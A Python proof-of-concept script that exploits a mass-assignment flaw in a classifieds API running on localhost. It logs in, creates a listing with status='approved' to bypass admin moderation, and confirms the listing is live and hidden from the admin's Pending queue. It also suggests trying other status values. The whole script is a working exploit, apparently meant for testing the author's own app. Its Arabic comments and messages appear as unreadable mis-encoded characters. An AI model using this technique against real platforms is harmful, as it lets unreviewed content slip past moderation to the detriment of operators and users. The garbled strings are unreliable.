#!/usr/bin/env python3
"""
Quick test script to exploit the status vulnerability
Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø³Ø±ÙŠØ¹ Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø«ØºØ±Ø© Ø§Ù„Ø£Ù…Ù†ÙŠØ©
"""

import requests
import json

# Configuration
BASE_URL = "http://localhost:8000/api"
PHONE = "+22242038210"  # Change this to your phone
PASSWORD = "your_password"  # Change this to your password

def login():
    """Login and get access token"""
    print("ğŸ” ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„... (Logging in...)")
    
    response = requests.post(
        f"{BASE_URL}/auth/login/",
        json={
            "phone": PHONE,
            "password": PASSWORD
        }
    )
    
    if response.status_code == 200:
        data = response.json()
        token = data['tokens']['access']
        print("âœ… ØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¨Ù†Ø¬Ø§Ø­! (Login successful!)")
        return token
    else:
        print(f"âŒ ÙØ´Ù„ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„: {response.text}")
        return None

def exploit_create_listing(token, include_images=False):
    """Create listing with status='approved' to bypass admin approval"""
    print("\nğŸ”“ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø«ØºØ±Ø© Ø§Ù„Ø£Ù…Ù†ÙŠØ©... (Exploiting vulnerability...)")
    
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    # Create listing with status='approved' - this bypasses admin approval!
    data = {
        "title": "ğŸš¨ Test Product - Bypassed Admin Approval",
        "description": "This product was created using the status vulnerability and bypassed admin approval!",
        "type": "car",
        "purpose": "sale",
        "price": "75000",
        "currency": "AED",
        "location": "Dubai",
        "ad_type": "simple",
        "status": "approved"  # âš ï¸ VULNERABLE FIELD - This bypasses admin approval!
    }
    
    # Optional: Add images if requested
    files = None
    if include_images:
        print("ğŸ“· Ù…Ø­Ø§ÙˆÙ„Ø© Ø¥Ø¶Ø§ÙØ© ØµÙˆØ±... (Trying to add images...)")
        # You can add image paths here
        # files = [
        #     ('images', open('path/to/image1.jpg', 'rb')),
        #     ('images', open('path/to/image2.jpg', 'rb'))
        # ]
        print("   â„¹ï¸ Ù„Ø¥Ø¶Ø§ÙØ© ØµÙˆØ±ØŒ Ø¹Ø¯Ù‘Ù„ Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª ÙˆØ£Ø¶Ù Ù…Ø³Ø§Ø±Ø§Øª Ø§Ù„ØµÙˆØ±")
    
    response = requests.post(
        f"{BASE_URL}/listings/",
        headers=headers,
        data=data,
        files=files
    )
    
    if response.status_code == 201:
        listing = response.json()
        print("âœ… ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ù…Ù†ØªØ¬ Ø¨Ù†Ø¬Ø§Ø­! (Product created successfully!)")
        print(f"\nğŸ“‹ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…Ù†ØªØ¬ (Product Details):")
        print(f"   ID: {listing.get('id')}")
        print(f"   Title: {listing.get('title')}")
        print(f"   Status: {listing.get('status')} âš ï¸")
        print(f"   Price: {listing.get('price')} {listing.get('currency')}")
        print(f"\nâœ… Ø§Ù„Ù…Ù†ØªØ¬ Ø§Ù„Ø¢Ù† Ù…ÙˆØ§ÙÙ‚ Ø¹Ù„ÙŠÙ‡ Ù…Ø¨Ø§Ø´Ø±Ø© ÙˆÙŠÙ…ÙƒÙ† Ø±Ø¤ÙŠØªÙ‡ ÙÙŠ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©!")
        print("âœ… The product is now approved and visible on the main page!")
        return listing
    else:
        print(f"âŒ ÙØ´Ù„ Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ù…Ù†ØªØ¬: {response.status_code}")
        print(f"   Error: {response.text}")
        return None

def verify_listing(listing_id, token):
    """Verify that the listing is approved and visible"""
    print(f"\nğŸ” Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…Ù†ØªØ¬ ID: {listing_id}...")
    
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    response = requests.get(
        f"{BASE_URL}/listings/{listing_id}/",
        headers=headers
    )
    
    if response.status_code == 200:
        listing = response.json()
        status = listing.get('status')
        
        if status == 'approved':
            print("âœ… âœ… âœ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù†Ø§Ø¬Ø­! Ø§Ù„Ù…Ù†ØªØ¬ Ù…ÙˆØ§ÙÙ‚ Ø¹Ù„ÙŠÙ‡!")
            print("âœ… âœ… âœ… Verification successful! Product is approved!")
        else:
            print(f"âš ï¸ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ù†ØªØ¬: {status}")
            print(f"âš ï¸ Product status: {status}")
        
        return listing
    else:
        print(f"âŒ ÙØ´Ù„ Ø§Ù„ØªØ­Ù‚Ù‚: {response.status_code}")
        return None

if __name__ == "__main__":
    print("=" * 60)
    print("ğŸ”“ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø«ØºØ±Ø© Ø§Ù„Ø£Ù…Ù†ÙŠØ© - Status Vulnerability Test")
    print("=" * 60)
    
    # Step 1: Login
    token = login()
    if not token:
        print("\nâŒ Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ø¨Ø¯ÙˆÙ† token")
        exit(1)
    
    # Step 2: Exploit - Create listing with status='approved'
    # Set include_images=True if you want to add images (and update image paths)
    listing = exploit_create_listing(token, include_images=False)
    
    if listing:
        # Step 3: Verify
        verify_listing(listing.get('id'), token)
        
        print("\n" + "=" * 60)
        print("âœ… Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ù…ÙƒØªÙ…Ù„! (Test completed!)")
        print("=" * 60)
        print("\nğŸ’¡ Ù†ØµØ§Ø¦Ø­ (Tips):")
        print("   1. Ø§ÙØªØ­ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ© ÙˆØªØ­Ù‚Ù‚ Ù…Ù† Ø¸Ù‡ÙˆØ± Ø§Ù„Ù…Ù†ØªØ¬")
        print("   2. Ø§ÙØªØ­ Admin Dashboard - Ù„Ù† ÙŠØ¸Ù‡Ø± ÙÙŠ Ù‚Ø§Ø¦Ù…Ø© Pending")
        print("   3. Ø¬Ø±Ø¨ Ù‚ÙŠÙ… Ù…Ø®ØªÙ„ÙØ©: 'rejected', 'sold', 'pending'")
        print("\nğŸ’¡ Tips:")
        print("   1. Open main page and check if product appears")
        print("   2. Open Admin Dashboard - won't appear in Pending list")
        print("   3. Try different values: 'rejected', 'sold', 'pending'")
    else:
        print("\nâŒ ÙØ´Ù„ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± (Test failed)")

